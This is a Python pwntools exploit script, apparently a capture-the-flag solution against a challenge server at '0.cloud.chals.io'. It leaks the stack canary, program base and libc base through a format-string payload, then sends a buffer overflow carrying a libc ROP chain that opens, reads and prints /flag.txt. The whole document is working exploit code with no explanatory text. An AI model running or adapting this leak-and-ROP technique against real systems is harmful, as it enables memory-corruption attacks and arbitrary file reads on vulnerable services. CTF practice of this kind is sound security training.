#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("task_patched")
libc = ELF("./libc-2.27.so")


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "0.cloud.chals.io","33744"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# leak canary, exe & libc addresses
sla('message: ', '.%15$p..%17$p..%19$p.')
#Â got our leaks
canary = int(rcu('.','.'),16)
logleak('canary', canary)
exe.address = int(rcu('.','.'),16)-0xc63
logleak('prog base', exe.address)
libc.address = int(rcu('.','.'),16)-0x21c87
logbase()

# our rop
rop = ROP(libc)
buff = exe.bss(0xa00)
rop.call('gets', [buff])
rop.call('open', [buff,0])
rop.call('read', [3, buff,128])
rop.call('write', [1, buff,128])

payload = b'x'*0x48+p64(canary)+p64(0xdeadbeef)+ rop.chain()
sla('message: ', payload)

p.clean()
# flag filename 
sl('/flag.txt\x00')

p.interactive()

